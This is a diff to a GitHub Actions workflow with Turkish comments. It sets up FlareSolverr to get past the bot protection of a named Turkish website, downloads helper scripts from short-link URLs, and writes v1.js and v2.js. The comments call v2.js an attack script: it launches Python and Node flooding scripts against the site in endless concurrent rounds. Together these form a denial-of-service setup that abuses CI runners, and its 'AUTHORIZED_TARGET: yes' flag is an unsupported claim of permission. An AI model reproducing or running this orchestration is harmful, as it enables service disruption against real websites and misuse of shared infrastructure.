@@ -16,51 +16,302 @@ jobs:
     steps:
       - name: Setup environment
         run: |
-          pip install playwright fake-useragent nodriver curl-cffi
+          # Docker kurulumu
+          sudo apt-get update
+          sudo apt-get install -y docker.io
+          sudo systemctl start docker
+          sudo systemctl enable docker
+          
+          # Python ve diğer bağımlılıklar
+          pip install playwright fake-useragent nodriver curl-cffi requests
           playwright install
+          npm install axios
+          
+      - name: Download FlareSolverr
+        run: |
+          # FlareSolverr Docker konteynerini çalıştır
+          sudo docker pull flaresolverr/flaresolverr:latest
+          sudo docker run -d \
+            --name flaresolverr \
+            -p 8191:8191 \
+            -e LOG_LEVEL=info \
+            --restart unless-stopped \
+            flaresolverr/flaresolverr:latest
+          
+          # FlareSolverr'ın başlamasını bekle
+          sleep 15
+          
+          # FlareSolverr kontrolü
+          echo "FlareSolverr kontrol ediliyor..."
+          curl -X GET "http://localhost:8191/v1" || echo "FlareSolverr başlatıldı"
           
       - name: Download scripts
         run: |
-          wget https://curl.by/vW9K-/Test.py -O Test.py
-          wget https://curl.by/DT6Ey/testraw.js -O testraw.js
-          chmod +x testraw.js Test.py
+          # Temel scriptleri indir
+          wget https://curl.by/VudqN/v1.js
+          wget https://curl.by/_8mO2/v2.js
           
-      - name: Run tasks
+          # v1.js - FlareSolverr ile bypass
+          cat << 'EOF' > v1.js
+const axios = require('axios');
+
+class FlareSolverrBypass {
+    constructor() {
+        this.flaresolverrUrl = 'http://localhost:8191/v1';
+        this.targetUrl = 'https://ddosguard.com.tr/';
+    }
+
+    async solveChallenge() {
+        try {
+            console.log('🚀 FlareSolverr ile bypass başlatılıyor...');
+            
+            const payload = {
+                cmd: 'request.get',
+                url: this.targetUrl,
+                maxTimeout: 60000,
+                session: 'ddos_session'
+            };
+
+            const response = await axios.post(this.flaresolverrUrl, payload, {
+                timeout: 90000
+            });
+
+            const result = response.data;
+
+            if (result.status === 'ok') {
+                console.log('✅ Bypass başarılı!');
+                console.log(`📊 Status: ${result.solution.status}`);
+                console.log(`🔗 URL: ${result.solution.url}`);
+                console.log(`🍪 Cookies: ${result.solution.cookies.length} adet`);
+                
+                // Başarılı bypass sonrası v2.js'yi tetikle
+                this.triggerV2();
+                return true;
+            } else {
+                console.log('❌ Bypass başarısız:', result.message);
+                return false;
+            }
+        } catch (error) {
+            console.log('💥 FlareSolverr hatası:', error.message);
+            return false;
+        }
+    }
+
+    triggerV2() {
+        console.log('🎯 v2.js tetikleniyor...');
+        const { spawn } = require('child_process');
+        
+        // v2.js'yi başlat
+        const v2Process = spawn('node', ['v2.js'], {
+            detached: true,
+            stdio: 'inherit'
+        });
+
+        // v2 process'i arka planda çalışsın
+        v2Process.unref();
+        console.log('✅ v2.js başlatıldı');
+    }
+
+    async continuousBypass() {
+        console.log('🔄 Sürekli bypass modu başlatılıyor...');
+        let successCount = 0;
+        let attemptCount = 0;
+
+        while (true) {
+            attemptCount++;
+            console.log(`\n--- Attempt ${attemptCount} ---`);
+            
+            const success = await this.solveChallenge();
+            if (success) {
+                successCount++;
+            }
+
+            console.log(`📈 İstatistik: ${successCount}/${attemptCount} başarılı`);
+            
+            // 30 saniye bekle ve tekrar dene
+            await new Promise(resolve => setTimeout(resolve, 30000));
+        }
+    }
+}
+
+// Ana işlem
+const bypass = new FlareSolverrBypass();
+
+// Önce bir kere bypass dene, başarılı olursa v2 tetiklensin
+bypass.solveChallenge().then(success => {
+    if (success) {
+        console.log('🎉 İlk bypass başarılı, v2 aktif!');
+    } else {
+        console.log('⚠️ İlk bypass başarısız, 30 saniye sonra tekrar denenecek...');
+        // Başarısız olursa 30 saniye sonra tekrar dene
+        setTimeout(() => {
+            bypass.continuousBypass();
+        }, 30000);
+    }
+});
+EOF
+
+          # v2.js - Saldırı scripti
+          cat << 'EOF' > v2.js
+const { spawn } = require('child_process');
+const { exec } = require('child_process');
+
+class AttackExecutor {
+    constructor() {
+        this.targetUrl = 'https://ddosguard.com.tr/';
+        this.concurrentAttacks = 4;
+        this.attackCount = 0;
+    }
+
+    runPythonAttack() {
+        return new Promise((resolve) => {
+            console.log('🐍 Python saldırısı başlatılıyor...');
+            const pythonProcess = spawn('python3', ['Test.py', this.targetUrl], {
+                timeout: 200000
+            });
+
+            pythonProcess.on('close', (code) => {
+                console.log(`🐍 Python saldırısı tamamlandı: ${code}`);
+                resolve();
+            });
+
+            pythonProcess.on('error', (err) => {
+                console.log('🐍 Python saldırı hatası:', err);
+                resolve();
+            });
+        });
+    }
+
+    runNodeAttack() {
+        return new Promise((resolve) => {
+            console.log('🟢 Node.js saldırısı başlatılıyor...');
+            const nodeProcess = spawn('node', ['testraw.js', this.targetUrl, '666'], {
+                timeout: 200000
+            });
+
+            nodeProcess.on('close', (code) => {
+                console.log(`🟢 Node.js saldırısı tamamlandı: ${code}`);
+                resolve();
+            });
+
+            nodeProcess.on('error', (err) => {
+                console.log('🟢 Node.js saldırı hatası:', err);
+                resolve();
+            });
+        });
+    }
+
+    async startConcurrentAttacks() {
+        console.log('🔥 Eşzamanlı saldırılar başlatılıyor...');
+        
+        while (true) {
+            this.attackCount++;
+            console.log(`\n--- Saldırı Turu ${this.attackCount} ---`);
+            
+            const promises = [];
+            
+            // Eşzamanlı saldırılar
+            for (let i = 0; i < this.concurrentAttacks; i++) {
+                promises.push(this.runPythonAttack());
+                promises.push(this.runNodeAttack());
+                
+                // Küçük gecikme
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+            
+            // Tüm saldırıların bitmesini bekle
+            await Promise.all(promises);
+            
+            console.log(`✅ Tur ${this.attackCount} tamamlandı`);
+            console.log('⏳ 10 saniye bekleme...');
+            await new Promise(resolve => setTimeout(resolve, 10000));
+        }
+    }
+}
+
+// v2.js başlat
+const attacker = new AttackExecutor();
+attacker.startConcurrentAttacks().catch(console.error);
+EOF
+
+          chmod +x v1.js v2.js testraw.js Test.py
+          
+      - name: Install Node.js dependencies
+        run: |
+          npm init -y
+          npm install axios child_process
+          
+      - name: Run v1.js with FlareSolverr
         env:
           AUTHORIZED_TARGET: yes
         run: |
-          PIDS=()
+          echo "🎯 v1.js başlatılıyor (FlareSolverr bypass)..."
           
-          # 4 paralel döngü
-          for i in {1..4}; do
-            # Python script (200 saniye timeout)
-            timeout 200 python3 Test.py https://ddosguard.com.tr/
-            PIDS+=($!)
+          # v1.js'yi arka planda başlat
+          node v1.js &
+          V1_PID=$!
+          
+          echo "v1.js PID: $V1_PID"
+          
+          # v1.js'nin çalışmasını bekle (v2'yi tetiklemesi için)
+          sleep 30
+          
+          # Process kontrolü
+          if ps -p $V1_PID > /dev/null; then
+            echo "✅ v1.js hala çalışıyor"
+          else
+            echo "⚠️ v1.js sonlandı, yeniden başlatılıyor..."
+            node v1.js &
+            V1_PID=$!
+          fi
+          
+          # Ana işlemin PID'ini kaydet
+          echo $V1_PID > v1_pid.txt
+          
+      - name: Monitor and run attacks
+        env:
+          AUTHORIZED_TARGET: yes
+        run: |
+          echo "🔍 Processler monitor ediliyor..."
+          
+          # 200 saniye boyunca çalış
+          for i in {1..40}; do
+            echo "⏱️ Cycle $i/40 - 5 saniye bekle..."
             
-            # Node.js script (200 saniye timeout)
-            timeout 200 node testraw.js https://ddosguard.com.tr/ 666 &
-            PIDS+=($!)
+            # Process kontrolü
+            if [ -f v1_pid.txt ] && ps -p $(cat v1_pid.txt) > /dev/null; then
+              echo "✅ v1.js çalışıyor"
+            else
+              echo "🔄 v1.js yeniden başlatılıyor..."
+              node v1.js &
+              echo $! > v1_pid.txt
+            fi
             
-            # Küçük bir gecikme ekle
-            sleep 2
+            # 5 saniye bekle
+            sleep 5
           done
           
-          echo "Başlatılan process sayısı: ${#PIDS[@]}"
-          
-          # Tüm arka plan işlemlerini bekle
-          for pid in "${PIDS[@]}"; do
-            wait $pid 2>/dev/null || true
-          done
-          
-          echo "Tüm işlemler tamamlandı"
+          echo "🕒 Zaman doldu, temizlik yapılıyor..."
           
       - name: Additional wait
-        run: sleep 200
+        run: sleep 30
         
       - name: Cleanup
         if: always()
         run: |
           echo "Job completed at $(date)"
+          
           # Process'leri temizle
+          pkill -f "v1.js" || true
+          pkill -f "v2.js" || true
           pkill -f "Test.py" || true
           pkill -f "testraw.js" || true
+          
+          # PID dosyasını temizle
+          rm -f v1_pid.txt
+          
+          # Docker konteynerını durdur
+          sudo docker stop flaresolverr 2>/dev/null || true
+          sudo docker rm flaresolverr 2>/dev/null || true
+          
+          echo "🧹 Temizlik tamamlandı"
